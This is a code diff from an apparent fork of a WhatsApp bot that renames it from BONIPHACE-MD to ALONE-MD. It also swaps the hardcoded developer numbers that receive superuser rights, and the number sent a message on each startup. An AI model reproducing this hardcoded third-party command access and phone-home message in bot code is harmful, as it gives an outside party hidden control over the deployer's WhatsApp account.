@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/BONIPACE-MD;;;=>/g,"");
+var session = conf.session.replace(/ALONE-MD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 
 
@@ -80,7 +80,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['BONIPHACE-MD', "safari", "1.0.0"],
+            browser: ['ALONE-MD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -154,10 +154,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255716661569';
-            const dj2 = '255716661569';
-            const dj3 = "255716661569";
-            const luffy = '255716661569';
+            const dj = '255673750170';
+            const dj2 = '255673750170';
+            const dj3 = "255673750170";
+            const luffy = '255673750170';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -165,7 +165,7 @@ setTimeout(() => {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{BONIPHACE Md}...[][]");
+            console.log("\t [][]...{ALONE MD}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from : " + nomGroupe);
@@ -286,7 +286,7 @@ function mybotpic() {
         
                                     if(msg === null || !msg ||msg === 'undefined') {console.log('Message non trouver') ; return } 
         
-                                await zk.sendMessage(idBot,{ image : { url : './media/king.jpeg'},caption : `        💫 BONIPHACE MD DELETED INFORMATION💫\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
+                                await zk.sendMessage(idBot,{ image : { url : './media/king.jpeg'},caption : `        💫 ALONE MD DELETED INFORMATION💫\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
                                 .then( () => {
                                     zk.sendMessage(idBot,{forward : msg},{quoted : msg}) ;
                                 })
@@ -428,7 +428,7 @@ function mybotpic() {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Boniphace Md',
+                                        pack: 'Alone Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -442,7 +442,7 @@ function mybotpic() {
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by BONIPHACE-MD .`;
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by ALONE-MD .`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -684,7 +684,7 @@ zk.ev.on('group-participants.update', async (group) => {
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}\n\n> POWERED BY BONIPHACE TECH.`;
+${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -812,16 +812,16 @@ ${metadata.desc}\n\n> POWERED BY BONIPHACE TECH.`;
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ BONIPHACE-MD connecting in your account...");
+                console.log("ℹ️ ALONE-MD connecting in your account...");
             }
             else if (connection === 'open') {
-                console.log("✅ BONIPHACE-MD connected successfully☺️");
+                console.log("✅ ALONE-MD connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("BONIPHACE-MD by BONIPHACE TECH installing cmds😇\n\n");
+                console.log("ALONE-MD by TOPU TECH installing cmds😇\n\n");
                 //chargement des commandes 
                 console.log("chargement des commandes ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
@@ -848,20 +848,20 @@ ${metadata.desc}\n\n> POWERED BY BONIPHACE TECH.`;
                 else {
                     md = "undefined";
                 }
-                console.log("BONIPHACE-MD successfully connected✅");
+                console.log("ALONE-MD successfully connected✅");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `BONIPHACE-MD IS RUNNING NOW...
+                let cmsg = `ALONE-MD IS RUNNING NOW...
     
     Prefix : [ ${prefixe} ]
     Mode :${md} mode
     Total Command : ${evt.cm.length}
-    Owner : BONIPHACE TECH 🦸  
+    Owner : TOPU TECH 🦸  
 
-> THANK YOU FOR CHOOSING BONIPHACE-MD.\n`;
-                await zk.sendMessage("255716661569@s.whatsapp.net", { text: cmsg });
+> THANK YOU FOR CHOOSING ALONE-MD.\n`;
+                await zk.sendMessage("255673750170@s.whatsapp.net", { text: cmsg });
                 }
             }
             else if (connection == "close") {
